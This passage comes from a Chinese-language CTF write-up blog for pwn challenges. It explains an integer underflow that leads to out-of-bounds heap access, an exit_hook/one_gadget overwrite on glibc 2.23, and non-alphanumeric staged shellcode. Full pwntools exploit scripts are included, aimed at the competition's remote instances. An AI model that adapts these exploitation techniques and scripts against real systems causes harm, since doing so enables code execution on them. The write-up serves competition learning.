class="built_in">hex</span>(self.vm_mem)}</span>"</span>)</span><br><span class="line">        log.info(<span class="string">f"Data section at: <span class="subst">{<span class="built_in">hex</span>(self.data_section)}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_string_to_memory</span>(<span class="params">self, string_data, addr=<span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(string_data) &gt; <span class="number">4</span>:</span><br><span class="line">            log.warning(<span class="string">f"String is too long, truncating!"</span>)</span><br><span class="line">            string_data = string_data[:<span class="number">4</span>]</span><br><span class="line">        </span><br><span class="line">        int_value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(string_data):</span><br><span class="line">            int_value |= (c &lt;&lt; (<span class="number">8</span> * i))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            addr = self.data_section + <span class="number">0x100</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Store the 32-bit integer at once</span></span><br><span class="line">        instructions = []</span><br><span class="line">        instructions.append(self.imm(int_value, <span class="number">0</span>))  <span class="comment"># Load integer value into reg0</span></span><br><span class="line">        instructions.append(self.imm(addr, <span class="number">4</span>))       <span class="comment"># Load address into reg4</span></span><br><span class="line">        instructions.append(self.store(<span class="number">4</span>, <span class="number">0</span>))        <span class="comment"># Store reg0 at address in reg4</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> instructions, addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sys_read_patched</span>(<span class="params">self, fd, buf_addr, size</span>):</span><br><span class="line">        instructions = [</span><br><span class="line">            self.imm(fd, <span class="number">1</span>),</span><br><span class="line">            <span class="comment"># self.store(0, self.data_section + 4),</span></span><br><span class="line">            self.imm(buf_addr, <span class="number">2</span>),</span><br><span class="line">            <span class="comment"># self.store(1, self.data_section + 8),</span></span><br><span class="line">            self.imm(size, <span class="number">3</span>),</span><br><span class="line">            <span class="comment"># self.store(2, self.data_section + 12),</span></span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        sys_inst = self.sys(self.SYS_READ)</span><br><span class="line">        instructions.append(sys_inst)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># instructions += self.patch_opcode(sys_instr_addr, 0xF9)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> instructions</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sys_write_patched</span>(<span class="params">self, fd</span>):</span><br><span class="line">        instructions = [</span><br><span class="line">            self.imm(fd, <span class="number">1</span>),</span><br><span class="line">            <span class="comment"># self.store(0, self.data_section + 4),</span></span><br><span class="line">            <span class="comment"># self.imm(buf_addr),</span></span><br><span class="line">            <span class="comment"># self.store(1, self.vm_mem + 8),</span></span><br><span class="line">            <span class="comment"># self.imm(size),</span></span><br><span class="line">            <span class="comment"># self.store(2, self.vm_mem + 12),</span></span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        sys_inst = self.sys(self.SYS_WRITE)</span><br><span class="line">        instructions.append(sys_inst)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># instructions += self.patch_opcode(sys_instr_addr, 0xF9)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> instructions</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sys_open_patched</span>(<span class="params">self, filename_addr</span>):</span><br><span class="line">        instructions = [</span><br><span class="line">            <span class="comment"># self.imm(filename_addr, 0),</span></span><br><span class="line">            self.imm(filename_addr, <span class="number">1</span>),</span><br><span class="line">            <span class="comment"># self.store(1, 0)</span></span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        sys_inst = self.sys(self.SYS_OPEN)</span><br><span class="line">        instructions.append(sys_inst)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># instructions += self.patch_opcode(sys_instr_addr, 0xF9)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> instructions</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>):</span><br><span class="line">        filename = <span class="string">b"flag"</span></span><br><span class="line">        buffer_addr = self.data_section + <span class="number">0x10</span></span><br><span class="line">        sys_ptr_addr = self.vm_mem + <span class="number">0x20</span>  <span class="comment"># Address to store syscall pointers</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Write filename to memory (compact)</span></span><br><span class="line">        file_str_instrs, filename_addr = self.write_string_to_memory(filename)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Compact program</span></span><br><span class="line">        program = file_str_instrs</span><br><span class="line">        left = <span class="number">0xa</span> * <span class="number">9</span></span><br><span class="line">        program += [</span><br><span class="line">            self.imm(<span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            </span><br><span class="line">            self.imm(<span class="number">0x3f8</span>, <span class="number">0</span>),</span><br><span class="line">            self.add(<span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">            self.imm(self.code_section + <span class="number">0x99</span>, <span class="number">1</span>),</span><br><span class="line">            self.store(<span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">            </span><br><span class="line">            self.imm(<span class="number">0x1f8</span>, <span class="number">0</span>),</span><br><span class="line">            self.add(<span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">            self.imm(self.code_section + <span class="number">0xbd</span>, <span class="number">1</span>),</span><br><span class="line">            self.store(<span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">            </span><br><span class="line">            self.imm(<span class="number">0x2f8</span>, <span class="number">0</span>),</span><br><span class="line">            self.add(<span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">            self.imm(self.code_section + <span class="number">0xcf</span>, <span class="number">1</span>),</span><br><span class="line">            self.store(<span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        ]</span><br><span class="line">        success(<span class="string">"length =&gt; {}"</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(program))))</span><br><span class="line">        program += self.sys_open_patched(filename_addr) <span class="comment"># 9</span></span><br><span class="line">        program += self.sys_read_patched(<span class="number">3</span>, self.data_section + <span class="number">0x50</span>, <span class="number">0x50</span>)</span><br><span class="line">        program += self.sys_write_patched(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(program)</span><br><span class="line">        <span class="comment"># gdb.attach(self.p, "b sys")</span></span><br><span class="line">        result = self.execute_code(program)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        self.p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    target = process(<span class="string">"./vm"</span>)</span><br><span class="line">    target = remote(<span class="string">"instance.penguin.0ops.sjtu.cn"</span>, <span class="number">18830</span>)</span><br><span class="line">    vm = VM(target)</span><br><span class="line">    vm.setup()</span><br><span class="line">    vm.exploit()</span><br></pre></td></tr></table></figure>
<p>需要注意本题只能输入<code>0x100</code>个字节，所有orw，在r之后，后两个寄存器不用变，直接改第一个寄存器即可完成w，节省空间。</p>
<p>本地运行题目，获取flag:</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407174549643.png"></p>
<h3 id="thelampsecret">3 TheLampSecret</h3>
<p>一个堆题，但又不那么堆。程序大意是一个许愿的功能，在<code>init</code>里会分配两个堆块，一个是许愿池，一个是标记许愿池里每<code>0x40</code>(一个愿望)的使用情况。</p>
<p><code>wish_count &lt;&lt; 6</code>表明了每个愿望的大小就是<code>0x40</code>字节。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407175550506.png"></p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407175237999.png"></p>
<p>程序提供了几个功能，许愿，查看愿望，编辑愿望，删除愿望，重置愿望还有一个<code>thank tomorin</code></p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407175201422.png"></p>
<p><code>make</code> <code>view</code> <code>edit</code> <code>delete</code>都没什么洞，主要还是<code>reset</code>和<code>thank</code></p>
<p>先看<code>thank</code>， 是白给的一个栈溢出，但程序里没有提供后门函数，而且开了PIE，想要溢出还要泄露<code>canary</code>。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407175601782.png"></p>
<p>在<code>reset</code>里可以重置愿望池子，这里有一个很明显的负数溢出的漏洞。当我们输入<code>wish_count</code>是0时，会绕过<code>wish_count &gt; 3d</code>的检测，下面会把<code>wish_count - 1</code>，就变成了一个很大的无符号整形数。接下来由于这个<code>count</code>特别大，最终分配的新的愿望池子的<code>size</code>就是<code>0x114514</code></p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407175949495.png"></p>
<p>虽然但是，老子一开始是按照我<code>0xffffffff</code>的<code>count</code>分配的，你私自把<code>size</code>改小没通知<code>count</code>，导致这里间接出发了一个很严重的越界访问读写的漏洞。</p>
<p>从之前几个函数的操作中可以得知，他们对于愿望池的内存访问都是根据<code>wish_count</code>来的，所以我现在可以越界访问堆块外的数据。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407180414312.png"></p>
<p>由于分配的堆块是<code>0x114514</code>大小，是一个很大的大堆块，会分配在一个高地址区间，这个地址区间有两个更高地址的邻居:</p>
<ul>
<li><code>TLS</code> -&gt; 泄露canary</li>
<li><code>__rtld_global</code> -&gt; 打exit_hook</li>
</ul>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407181050657.png"></p>
<p>一开始想泄露canary，但是看了下<code>view_wish</code>， <code>%s</code>输出我泄露个蛋。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407181143202.png"></p>
<p>看<code>Dockerfile</code>， <code>ubuntu:16.04</code> 果断打<code>exit_hook</code></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">"s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g"</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>打<code>exit_hook</code>的触发条件是程序通过<code>exit</code>显式退出，或者程序通过<code>main</code>函数正常返回，在<code>libc 2.23 - 2.26</code>有效</p>
<p>需要能写到<code>ld</code>加载段，可以有两种修改<code>_rtld_global</code>的方式，任选其一：</p>
<ul>
<li>改<code>rtld_lock_default_lock_recursive</code>或 <code>rtld_lock_default_unlock_recursive</code>为<code>system</code>，<code>_dl_load_lock</code>为<code>/bin/sh\x00</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7fb213ac5dca</span> &lt;_dl_fini+<span class="number">106</span>&gt;    <span class="keyword">lea</span>    <span class="built_in">rdi</span>, [<span class="built_in">rip</span> + <span class="number">0x1cb97</span>]          &lt;_rtld_global+<span class="number">2312</span>&gt;</span><br><span class="line">► <span class="number">0x7fb213ac5dd1</span> &lt;_dl_fini+<span class="number">113</span>&gt;    <span class="keyword">call</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x1d191</span>]     &lt;execvpe+<span class="number">638</span>&gt;</span><br><span class="line"><span class="symbol">       rdi:</span> <span class="number">0x7fb213ae2968</span> (_rtld_global+<span class="number">2312</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rsi:</span> <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rdx:</span> <span class="number">0x7fb213ac5d60</span> (_dl_fini) ◂— endbr64 </span><br><span class="line"><span class="symbol">       rcx:</span> <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>改<code>rtld_lock_default_lock_recursive</code> 或 <code>rtld_lock_default_unlock_recursive</code> 为 one_gadget</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f83b9c36dd1</span> &lt;_dl_fini+<span class="number">113</span>&gt;    <span class="keyword">call</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x1d191</span>]     &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line"><span class="symbol">       rdi:</span> <span class="number">0x7f83b9c53968</span> (_rtld_global+<span class="number">2312</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rsi:</span> <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rdx:</span> <span class="number">0x7f83b9c36d60</span> (_dl_fini) ◂— endbr64 </span><br><span class="line"><span class="symbol">       rcx:</span> <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>三者在<code>_rtld_global</code>中的偏移如下：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ld_base</span> = libc_base + <span class="number">0</span>xffffffff</span><br><span class="line"><span class="attr">_rtld_global</span> = ld_base + ld.sym[<span class="string">'_rtld_global'</span>]</span><br><span class="line"><span class="attr">_dl_rtld_lock_recursive</span> = _rtld_global + <span class="number">0</span>xf08</span><br><span class="line"><span class="attr">_dl_rtld_unlock_recursive</span> = _rtld_global + <span class="number">0</span>xf10</span><br><span class="line"><span class="attr">_dl_load_lock</span> = _rtld_global + <span class="number">0</span>x908</span><br></pre></td></tr></table></figure>
</blockquote>
<p>引用: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12302?time__1311=eqUxu7DtDQitdiIPGN8xiu%3DUb7i%3DKTq4D&amp;u_atoken=004bf0f4ef22494251b13b1bbca18861&amp;u_asig=1a0c39d517440208189201302e003b">exit_hook攻击利用-先知社区</a></p>
<p>我们还需要泄露一个libc基地址，<code>make</code>里面是使用<code>memcpy</code>把<code>buf</code>里面的数据拷贝到愿望池中的，但在这之前并没有对<code>buf</code>进行清空操作，在<code>view</code>输出的时候就会把栈上的脏数据也一起拉出来。只要获得一个<code>libc</code>段的地址， 再减去偏移，就可以获得基地址。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407181920894.png"></p>
<p>本题的exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./chall"</span>)</span><br><span class="line"><span class="comment"># 0x0000000000001183 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000001181 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="comment"># p = remote("instance.penguin.0ops.sjtu.cn", 18756)</span></span><br><span class="line">ld = ELF(<span class="string">"./ld-2.23.so"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b"Enter index: "</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b"Enter wish: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">b"Enter index: "</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">count</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">b"I will reset your wish, how many wishes do you want now? Don't be greedy: "</span>, <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># _rtld_global = ld_base + ld.sym['_rtld_global']</span></span><br><span class="line"><span class="comment"># _dl_rtld_lock_recursive = _rtld_global + 0xf08</span></span><br><span class="line"><span class="comment"># _dl_rtld_unlock_recursive = _rtld_global + 0xf10</span></span><br><span class="line"><span class="comment"># _dl_load_lock = _rtld_global + 0x908</span></span><br><span class="line">offset = (<span class="number">0x7f75dcf39040</span> - <span class="number">0x7f75dce20010</span>) + <span class="number">0xf10</span></span><br><span class="line">index = offset // <span class="number">0x40</span></span><br><span class="line">padding = offset % <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = (0x7f9ea2c83728 - 0x7f9ea2b6d010)</span></span><br><span class="line"><span class="comment"># index = offset // 0x40</span></span><br><span class="line"><span class="comment"># padding = offset % 0x40</span></span><br><span class="line"><span class="comment"># success("index =&gt; {}, padding =&gt; {}".format(hex(index), hex(padding)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rax == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x30] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf03a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x50] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf1247 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br><span class="line"></span><br><span class="line">one_gadget_off = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">make(<span class="number">0</span>, <span class="string">b"aaaaaaaa"</span>)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"a"</span> * <span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - (libc.sym[<span class="string">"_IO_file_overflow"</span>] + <span class="number">235</span>)</span><br><span class="line">success(<span class="string">"libc_base =&gt; {}"</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">one_gadget = libc_base + one_gadget_off[<span class="number">2</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">reset(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">make(index, padding * <span class="string">b"a"</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b"a"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本地运行获取<code>shell</code>:</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407182200717.png"></p>
<h3 id="ezshellcode">4 ezShellcode</h3>
<p>手搓不可见字符shellcode 比手搓可见字符简单多了。</p>
<p>可以输入<code>0x100</code>个字节，<code>strlen</code>要求不能有<code>\x00</code>字符，不然会被截断，下面还有一个<code>check</code>，函数里面的意思就是保证shellcode里不能有[A-Za-z0-9]</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407182806742.png"></p>
<p>这题跟一般题目还有一个不一样的点就是，他会把输入的东西进行一个转换，转换之后的才是要执行的<code>shellcode</code>。</p>
<p>直接把转换逻辑丢给AI让他帮我逆了，看起来就是取相邻的两个字节，进行一个类似BCD码的转化（不懂啊不懂啊）。</p>
<p>明确以下几条规则：</p>
<ul>
<li>x86/64下大多数对32位寄存器的操作不产生可见字符</li>
<li>在跳转指令中<code>jg, jge</code>等无符号数比较不产生可见字符</li>
<li><code>jmp qword ptr</code>指令不产生可见字符（除非偏移的数值中产生可见字符）</li>
<li><code>mov dword ptr []</code>指令不产生可见字符（除非偏移的数值中产生可见字符）</li>
<li>针对32位寄存器的立即数操作，立即数会被对齐到32位，如果位数不够会产生<code>\x00</code></li>
<li><code>syscall</code>是<code>\0xf \0x5</code>，没有可见字符</li>
</ul>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407184225466.png"></p>
<p>本题思路如下：</p>
<ul>
<li>第一次输入<code>shellcode</code>由于会被校验，所以直接拿<code>shell</code>不现实，这里一般思路是获取栈上在<code>call rax</code>时被压进去的返回地址，跳转到<code>read</code>函数再来一次华丽的输入。</li>
<li>由于本题机制的原因，假如我们第一次返回到了<code>read</code>函数重新输入，这时候输入的地址是我们第一次<code>mmap</code>的地址，但<code>read</code>之后会在进行一次<code>mmap</code>， 这时候<code>v8</code>会被刷新为一个新的地址，那么存入<code>new v8</code>的数据，就是栈上的<code>buf</code>。注意这个<code>buf</code>, 等我们第二次<code>mmap</code>的时候，<code>buf</code>里存储的仍然是我们第一次输入的<code>shellcode</code>， 最终会<code>call new v8</code>, 再次运行一遍我们第一次输入的<code>shellcode</code>。</li>
<li>所以我们需要让一份<code>shellcode</code>, 在两次运行时，执行不同的功能：
<ul>
<li>第一次运行，获取栈上保存的返回地址，跳转到<code>read</code>函数，进行<code>old v8</code>内存的覆写，并将<code>old v8</code>指针保存在栈上，设置计数器</li>
<li>第二次运行，检查计数器，如果已经被执行过，获取第一次运行时保存在栈上的<code>old v8</code>, 跳转过去，<code>getshell</code></li>
</ul></li>
</ul>
<blockquote>
<p>栈真是个好东西，虽然程序在运行时会在函数里call 来call去，但是我<code>rbp</code>岿然不动，这里面还涉及到很多动调的细节，比较考验耐心就是了。</p>
</blockquote>
<p>本题<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">"instance.penguin.0ops.sjtu.cn"</span>, <span class="number">18676</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">0x156c</span> - <span class="number">0x13d2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义shellcode</span></span><br><span class="line">shellcode = <span class="string">f"""</span></span><br><span class="line"><span class="string">    mov bl, byte ptr [rbp - 0x10]</span></span><br><span class="line"><span class="string">    cmp bl, 0x0</span></span><br><span class="line"><span class="string">    jg next</span></span><br><span class="line"><span class="string">    mov ebx, dword ptr [rsp]</span></span><br><span class="line"><span class="string">    sub ebx, <span class="subst">{<span class="number">0x1111019a</span> + <span class="number">0x1111</span>}</span></span></span><br><span class="line"><span class="string">    add ebx, <span class="subst">{<span class="number">0x11111111</span>}</span></span></span><br><span class="line"><span class="string">    mov dword ptr [rsp], ebx</span></span><br><span class="line"><span class="string">    mov ebx, dword ptr [rbp - 0x138]</span></span><br><span class="line"><span class="string">    mov dword ptr [rbp - 0x8], ebx</span></span><br><span class="line"><span class="string">    mov bl, 0x1</span></span><br><span class="line"><span class="string">    mov byte ptr [rbp - 0x10], bl</span></span><br><span class="line"><span class="string">    jmp qword ptr [rsp]</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">next:</span></span><br><span class="line"><span class="string">    mov ebx, dword ptr [rbp - 8]</span></span><br><span class="line"><span class="string">    mov dword ptr [rbp - 0x138], ebx</span></span><br><span class="line"><span class="string">    jmp qword ptr [rbp - 0x138]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num_2_char</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= a &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">'0'</span>) + a)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0xa</span> &lt;= a &lt;= <span class="number">0xf</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">'a'</span>) + (a - <span class="number">0xa</span>))  </span><br><span class="line"></span><br><span class="line">payload = asm(shellcode, arch=<span class="string">'amd64'</span>)  </span><br><span class="line">payload_new = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    </span><br><span class="line">    byte_val = i </span><br><span class="line">    high = byte_val // <span class="number">0x10</span>  </span><br><span class="line">    low = byte_val % <span class="number">0x10</span>   </span><br><span class="line">    </span><br><span class="line">    payload_new += num_2_char(high) + num_2_char(low)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "brva 0x156A")</span></span><br><span class="line">p.sendlineafter(<span class="string">b"Your shellcode:"</span>, payload_new)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"\x00\x00"</span> + asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行<code>exp</code>，获取shell:</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407185122822.png"></p>

      
    </div>
    
  </div>
